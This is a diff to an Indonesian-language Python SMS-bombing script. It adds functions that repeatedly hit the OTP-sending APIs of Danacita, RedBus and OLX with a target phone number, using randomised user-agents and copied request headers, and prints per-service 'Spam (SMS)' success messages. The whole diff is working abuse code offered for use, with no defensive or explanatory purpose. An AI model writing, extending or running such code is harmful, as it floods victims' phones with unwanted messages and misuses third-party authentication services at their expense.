@@ -50,6 +50,12 @@ class main:
       loding()
       spam.theharvest(nom)
       loding()
+      spam.danacinta(nom)
+      loding()
+      spam.redbus(nom)
+      loding()
+      spam.olx(nom)
+      loding()
       print (f"{ken}[{kun}•{ken}] {kan}Proses selesai")
   except ru.ConnectionError:print (f"{ken}[{kun}•{ken}]{kan} Koneksi Error")
   except KeyboardInterrupt:print (f"{ken}[{kun}•{ken}]{kun} Program dihentikan")
@@ -375,6 +381,43 @@ class spam:
       print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}TheHarvest{kan} OK")
      else:
       print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}TheHarvest{kun} Gagal")
+ def danacinta(nom):
+     hd = {'user-agent':ua.random}
+     for x in range(5):
+       yu = ru.get("https://api.danacita.co.id/users/send_otp/?mobile_phone=0"+nom, headers=hd)
+     yu1 = json.loads(yu.text)
+     if yu1["detail"] == 'Successfully sent OTP SMS':
+      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}DanaCinta{kan} OK")
+     else:
+      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}DanaCinta{kun} Gagal")
+ def redbus(nom):
+     for i in range(2):
+       kil = ru.get("https://m.redbus.id/api/getOtp?number="+nom+"&cc=62&whatsAppOpted=true").text
+     if 'OTP' in kil:
+      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}RedBus{kan} OK")
+     else:
+      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}RedBus{kun} Gagal")
+ def olx(nom):
+     head = {
+        "accept": "*/*",
+        "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
+        "x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
+        "user-agent": ua.random ,
+        "content-type": "application/json",
+        }
+     dat = json.dumps({
+          "grantType": "retry",
+          "method": "sms",
+          "phone": "+62"+nom,
+          "language": "id"
+        })
+     r = ru.Session()
+     for x in range(5):
+        eek = r.post("https://www.olx.co.id/api/auth/authenticate",data=dat,headers=head).text
+     if 'status' in eek:
+       print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}OLX{kan} OK")
+     else:
+       print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}OLX{kun} Gagal")
 try:
  os.system("clear")
  bnr()
